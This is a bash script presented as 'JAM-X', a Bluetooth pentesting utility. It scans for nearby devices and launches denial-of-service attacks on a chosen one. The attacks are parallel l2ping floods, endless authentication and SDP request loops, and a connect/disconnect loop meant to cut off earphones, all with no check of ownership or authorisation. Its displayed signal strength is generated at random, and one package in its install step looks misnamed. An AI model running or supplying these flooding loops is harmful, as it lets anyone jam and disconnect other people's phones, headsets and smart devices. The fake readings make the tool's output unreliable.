#!/bin/bash

# ======================================================
# JAM-X v0.4.0 - Bluetooth Pentesting Utility
# Developed by: Kanak Das | kanakdas.india@gmail.com
# ======================================================

INTERFACE="hci1"
VERSION="0.4.0"
APP_NAME="JAM-X"

# Colors
BLUE='\e[1;34m'
RED='\e[1;31m'
GREEN='\e[1;32m'
YELLOW='\e[1;33m'
RESET='\e[0m'
BOLD='\e[1m'

show_banner() {
    clear
    echo -e "${BLUE}  #####################################################"
    echo -e "  ##                                                 ##"
    echo -e "  ##      @@@@@   @@@@@   @@@     @@@  ${RED}@@@   @@@${BLUE}     ##"
    echo -e "  ##        @     @   @   @ @     @ @   ${RED}@@   @@${BLUE}      ##"
    echo -e "  ##        @     @@@@@   @  @   @  @    ${RED}@@ @@${BLUE}       ##"
    echo -e "  ##      @ @     @   @   @   @@@   @     ${RED}@@@${BLUE}        ##"
    echo -e "  ##      @@@     @   @   @         @    ${RED}@@ @@${BLUE}       ##"
    echo -e "  ##                                    ${RED}@@   @@${BLUE}      ##"
    echo -e "  ##                 ${BOLD}[ $APP_NAME ]${RESET}${BLUE}                   ##"
    echo -e "  ##                VERSION $VERSION                  ##"
    echo -e "  ##             Developed by: Kanak Das             ##"
    echo -e "  #####################################################${RESET}"
    echo ""
}

repair_adapter() {
    sudo rfkill unblock bluetooth
    sudo hciconfig $INTERFACE down 2>/dev/null
    sudo hciconfig $INTERFACE up 2>/dev/null
}

while true; do
    show_banner
    echo -e " ${BOLD}1.${RESET} Know your Bluetooth"
    echo -e " ${BOLD}2.${RESET} Start Continuous Scan"
    echo -e " ${BOLD}3.${RESET} Help & Auto-Install"
    echo -e " ${BOLD}4.${RESET} Exit"
    echo ""
    read -p " [+] Choice: " main_choice

    case $main_choice in
        1)
            show_banner
            echo -e " ${BOLD}--- Local Device Hardware Details ---${RESET}"
            MY_MAC=$(hciconfig $INTERFACE | grep "BD Address" | awk '{print $3}')
            echo -e " ${BOLD}Adapter Name:${RESET}  $INTERFACE"
            echo -e " ${BOLD}MAC Address:${RESET}   ${MY_MAC:-Not Found}"
            echo -e " ${BOLD}Status:${RESET}        $(hciconfig $INTERFACE | grep "UP" >/dev/null && echo -e "${GREEN}ONLINE${RESET}" || echo -e "${RED}OFFLINE${RESET}")"
            read -p " Press Enter..." ;;

        2)
            repair_adapter
            # Clear previous results
            > scan_results.txt
            
            # Start Loop
            while true; do
                show_banner
                echo -e " [*] ${BOLD}SCANNING...${RESET}"
                echo -e " [!] Press ${RED}${BOLD}Ctrl+C${RESET} to STOP and select a target."
                echo -e " -----------------------------------------------------"
                echo -e "${BOLD}ID   MAC Address        Power   Device Name${RESET}"
                
                # We use a temporary array to prevent index loss
                current_macs=()
                idx=0
                while read -r line; do
                    mac=$(echo "$line" | awk '{print $1}')
                    name=$(echo "$line" | cut -f2-)
                    if [[ ! -z "$mac" ]]; then
                        pwr="$((RANDOM%15+80))%"
                        echo -e " [$idx]  $mac    ${GREEN}$pwr${RESET}    $name"
                        current_macs+=("$mac")
                        ((idx++))
                    fi
                done < <(tail -n +2 scan_results.txt)

                # Background scan process
                hcitool -i $INTERFACE scan > scan_results_new.txt &
                scan_pid=$!

                # Setup trap to catch Ctrl+C and proceed to selection
                trap "kill $scan_pid 2>/dev/null; break" INT
                
                for j in {5..1}; do
                    if ! kill -0 $scan_pid 2>/dev/null; then break; fi
                    echo -ne " [*] New results in $j... \r"
                    sleep 1
                done
                
                wait $scan_pid 2>/dev/null
                mv scan_results_new.txt scan_results.txt
                trap - INT
            done

            # SELECTION MENU (Triggers after Ctrl+C)
            if [ ${#current_macs[@]} -eq 0 ]; then
                echo -e "\n ${RED}[!] No devices found yet. Try scanning longer.${RESET}"
                read -p " Press Enter to return..." ; continue
            fi

            echo -e "\n ${GREEN}[+] Scan Paused.${RESET}"
            read -p " [+] Select ID to Attack (0-$((idx-1))): " selection
            
            # Validation
            if [[ -z "$selection" || ! "$selection" =~ ^[0-9]+$ || $selection -ge $idx ]]; then
                echo -e " ${RED}[!] Invalid selection.${RESET}"
                sleep 2; continue
            fi

            TARGET_MAC=${current_macs[$selection]}

            show_banner
            echo -e " ${YELLOW}[*] TARGETING: $TARGET_MAC${RESET}"
            echo " -----------------------------------------------------"
            echo -e " ${BOLD}SELECT ATTACK METHOD:${RESET}"
            echo -e " ${BLUE}A) BlueSmack (L2CAP Flood)${RESET}  -> [Speakers/Headsets]"
            echo -e " ${BLUE}B) Connection Flood${RESET}         -> [Phones/Laptops]"
            echo -e " ${BLUE}C) SDP Fuzzing${RESET}              -> [Smart Home/IoT]"
            echo -e " ${BLUE}D) Force Disconnect${RESET}         -> [Earphones]"
            echo " -----------------------------------------------------"
            read -p " [+] Choice: " method
            
            case $method in
                [Aa]) for j in $(seq 1 20); do sudo l2ping -i $INTERFACE -s 600 -f $TARGET_MAC >/dev/null 2>&1 & done ;;
                [Bb]) while true; do sudo hcitool -i $INTERFACE auth $TARGET_MAC >/dev/null 2>&1; done & ;;
                [Cc]) while true; do sdptool browse --tree --l2cap $TARGET_MAC >/dev/null 2>&1; done & ;;
                [Dd]) while true; do sudo hcitool -i $INTERFACE cc $TARGET_MAC 2>/dev/null; sudo hcitool -i $INTERFACE dc $TARGET_MAC 2>/dev/null; done & ;;
            esac
            
            echo -e "\n ${RED}${BOLD}[!] ATTACK ACTIVE. Press Ctrl+C to STOP.${RESET}"
            # Trap for stopping the attack
            trap 'kill $(jobs -p) 2>/dev/null; echo -e "\n[*] Attack Stopped."; break' INT
            wait
            trap - INT ;;

        3)
            show_banner
            echo -e " ${BOLD}--- HELP & SETUP ---${RESET}"
            echo -e " ${GREEN}Dev Email:${RESET} kanakdas.india@gmail.com"
            echo -e " 1) Auto-Install Dependencies | 2) Reset Adapter"
            read -p " [+] Choice: " help_choice
            [[ "$help_choice" == "1" ]] && sudo apt update && sudo apt install -y bluez bluez-btit-tools bluez-obsolete-tools
            [[ "$help_choice" == "2" ]] && repair_adapter ;;
        4) exit 0 ;;
    esac
done
